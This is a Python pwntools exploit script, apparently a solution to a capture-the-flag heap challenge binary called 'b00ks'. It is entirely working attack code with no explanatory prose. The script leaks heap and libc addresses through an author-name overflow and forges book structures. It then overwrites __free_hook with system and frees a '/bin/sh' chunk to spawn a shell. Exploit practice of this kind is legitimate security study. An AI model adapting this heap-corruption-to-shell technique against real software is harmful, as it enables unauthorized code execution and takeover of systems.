#!/usr/bin/env python
import pwn
import re

p = pwn.process(['./b00ks'])
pwn.context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

hbasetotop = 0x14E8
ltosys = -0x17B0E0
ltofreehook = 0x1C48

def start(auname, sen = 0):
    p.recvuntil("name:")
    if sen == 0:
        p.sendline(auname)
    else:
        p.send(auname)
    return

def create_book(namsize, name, descsize, desc, rec = 1, sen1 = 0, sen2 = 0):
    if rec == 1:
        p.recvuntil(">")
    p.sendline("1")
    p.recvuntil("size:")
    p.sendline(str(namsize))
    p.recvuntil("chars):")
    if sen1 == 0:
        p.sendline(name)
    else:
        p.send(name)
    p.recvuntil("size:")
    p.sendline(str(descsize))
    p.recvuntil("description:")
    if descsize == 0:
        return
    elif sen2 == 0:
        p.sendline(desc)
    else:
        p.send(desc)
    return

def edit_book(ID, desc, rec = 1, sen = 0):
    if rec == 1:
        p.recvuntil(">")
    p.sendline("3")
    p.recvuntil("edit:")
    p.sendline(str(ID))
    p.recvuntil("description:")
    if sen == 0:
        p.sendline(desc)
    else:
        p.send(desc)
    return

def print_book(rec = 1):
    if rec == 1:
        p.recvuntil(">")
    p.sendline("4")
    r = p.recvuntil("Exit")
    return r
\
def delete_book(ID, rec = 1):
    if rec == 1:
        p.recvuntil(">")
    p.sendline("2")
    p.recvuntil("delete:")
    p.sendline(str(ID))
    return

def change_author(name, rec = 1, sen = 0):
    if rec == 1:
        p.recvuntil(">")
    p.sendline("5")
    p.recvuntil("name:")
    if sen == 0:
        p.sendline(name)
    else:
        p.send(name)
    return

def quit(rec = 1):
    if rec == 1:
        p.recvuntil(">")
    p.sendline("6")
    p.recvuntil("software")
    return
            

start("AAA")
create_book(0x30,"BBB",0x40,"CCC")
create_book(0x50,"BBB",0x50,"CCC")
create_book(0x40,"BBB",0x40,"CCC")
delete_book(3)
delete_book(1)
delete_book(2)
create_book(0x50,"BBB",0x50,"CCC")
change_author("A"*0x20)
r = print_book()
r1 = re.search("Description.*", r).group(0)[13:].ljust(8,"\x00")
la = pwn.util.packing.unpack(r1, 'all', endian = 'little', signed = False)
print "[+] Address on heap: "+hex(la)
heapbase = la - 0x1470
print "[+] Heap base at: "+hex(heapbase)
r2 = re.search("ID:.*", r).group(0)[4:]
ID = int(r2)
topsize = heapbase + hbasetotop
sen1 = pwn.p64(0x20)+pwn.p64(topsize)+pwn.p64(topsize)+"\xFF\xFF"
create_book(0x30,"ABCD",0x20,sen1)
edit_book(0x20,pwn.p64(0xb21))
create_book(0xc00,"/bin/sh",0xc00,"BBBB")
ladd = topsize+0x40
sen2 = pwn.p64(0x20)+pwn.p64(ladd)+pwn.p64(ladd)+"\xFF\xFF"
edit_book(5,sen2)
r = print_book()
r = re.search("Name:.*", r).group(0)[6:].ljust(8,"\x00")
la2 = pwn.util.packing.unpack(r, 'all', endian = 'little', signed = False)
print "[+] Address inside libc: "+hex(la2)
sys = la2 + ltosys
freehook = la2 + ltofreehook
print "[+] System is at: "+hex(sys)
print "[+] Free hook is at: "+hex(freehook)
sen3 = pwn.p64(0x20)+pwn.p64(freehook)+pwn.p64(freehook)+"\xFF\xFF"
edit_book(5, sen3)
edit_book(0x20,pwn.p64(sys))
delete_book(6)


print "[+] Shell spawned."




p.interactive()
